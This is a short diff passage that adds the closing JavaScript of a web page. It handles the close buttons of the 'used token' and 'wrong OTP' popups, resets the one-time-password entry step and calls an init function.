+  document.getElementById('closeUsedToken').addEventListener('click', () => hidePopup('usedTokenPopup'));
+  document.getElementById('closeWrongOtp').addEventListener('click', () => {
+    hidePopup('wrongOtpPopup');
+    show('step2');
+    document.getElementById('verifyOtpBtn').disabled = false;
+    document.getElementById('verifyOtpBtn').textContent = 'Submit OTP →';
+    hide('waitingBox');
+    document.getElementById('otpBoxes').querySelectorAll('.otp').forEach(i => i.value = '');
+    document.getElementById('o1')?.focus();
+  });
+
+  // Initialize
+  init();
+</script>
+</body>
+</html>
